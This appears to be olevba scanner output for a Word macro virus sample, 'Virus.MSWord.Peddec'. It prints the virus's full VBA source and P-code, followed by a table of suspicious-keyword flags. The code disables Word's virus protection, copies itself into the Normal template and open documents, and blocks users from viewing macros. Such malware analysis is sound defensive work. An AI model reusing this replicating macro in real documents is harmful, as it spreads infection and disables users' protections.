olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Peddec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Peddec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'
'
'
Rem Version 2001.3.1
Sub HelpAbout()
H = MsgBox("This Macrosoft Word (TM) program is licensed to :Sting", vbOKOnly + vbExclamation, "XIXI")
End Sub
Sub ToolsMacro()
H = MsgBox("Sorry ... you dont have the rights", vbExclamation + vbOKOnly)
End Sub
Sub ViewVbCode()
ToolsMacro
End Sub
Sub toolsrecordmacrostart()
ToolsMacro
End Sub
Sub ViewSecurity()
ToolsMacro
'Sub Filesave()
ActiveDocument.Save
CommandBars("Standard").Controls(3).Copy Before:=5
End Sub
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
EnableCancelKey = wdCancelDisabled
Set sourcecode = MacroContainer.VBProject.VBComponents.Item(1).codemodule
Set Des = NormalTemplate: n = "Rem V2001"
If MacroContainer = Des Then Set Des = ActiveDocument: n = "Rem V2001"
Set dep = Des.VBProject.VBComponents
Set dec = dep.Item(1).codemodule
For i = 1 To dep.Count
dep.Remove dep.Item(i)
Next i
dec.deletelines 1, dec.countoflines
For i = 1 To sourcecode.countoflines
    If i <= 20 Then
        If Left(sourcecode.lines(i, 1), 1) = "'" Then
            dec.insertlines i, Mid$(sourcecode.lines(i, 1), 2)
         Else
            dec.insertlines i, "'" + sourcecode.lines(i, 1)
        End If
     Else
        dec.insertlines i, sourcecode.lines(i, 1)
    End If
Next i
CommandBars("Standard").Controls(3).Copy Before:=5
ActiveDocument.Save
NormalTemplate.Save
EnableCancelKey = wdCancelDisabled
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Peddec
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5482 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	Rem 0x0011 " Version 2001.3.1"
' Line #5:
' 	FuncDefn (Sub HelpAbout())
' Line #6:
' 	LitStr 0x0036 "This Macrosoft Word (TM) program is licensed to :Sting"
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0004 "XIXI"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub ToolsMacro())
' Line #9:
' 	LitStr 0x0022 "Sorry ... you dont have the rights"
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St H 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Sub ViewVbCode())
' Line #12:
' 	ArgsCall ToolsMacro 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub toolsrecordmacrostart())
' Line #15:
' 	ArgsCall ToolsMacro 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub ViewSecurity())
' Line #18:
' 	ArgsCall ToolsMacro 0x0000 
' Line #19:
' 	QuoteRem 0x0000 0x000E "Sub Filesave()"
' Line #20:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #21:
' 	LitDI2 0x0005 
' 	ParamNamed Before 
' 	LitDI2 0x0003 
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub Document_Open())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set sourcecode 
' Line #28:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Des 
' 	BoS 0x0000 
' 	LitStr 0x0009 "Rem V2001"
' 	St n 
' Line #29:
' 	Ld MacroContainer 
' 	Ld Des 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Des 
' 	BoS 0x0000 
' 	LitStr 0x0009 "Rem V2001"
' 	St n 
' 	EndIf 
' Line #30:
' 	SetStmt 
' 	Ld Des 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dep 
' Line #31:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld dep 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set dec 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dep 
' 	MemLd Count 
' 	For 
' Line #33:
' 	Ld i 
' 	Ld dep 
' 	ArgsMemLd Item 0x0001 
' 	Ld dep 
' 	ArgsMemCall Remove 0x0001 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld dec 
' 	MemLd countoflines 
' 	Ld dec 
' 	ArgsMemCall deletelines 0x0002 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sourcecode 
' 	MemLd countoflines 
' 	For 
' Line #37:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Le 
' 	IfBlock 
' Line #38:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld sourcecode 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld sourcecode 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$$ 0x0002 
' 	Ld dec 
' 	ArgsMemCall insertlines 0x0002 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld sourcecode 
' 	ArgsMemLd lines 0x0002 
' 	Add 
' 	Ld dec 
' 	ArgsMemCall insertlines 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld sourcecode 
' 	ArgsMemLd lines 0x0002 
' 	Ld dec 
' 	ArgsMemCall insertlines 0x0002 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	LitDI2 0x0005 
' 	ParamNamed Before 
' 	LitDI2 0x0003 
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #50:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #51:
' 	EndSub 
' Line #52:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

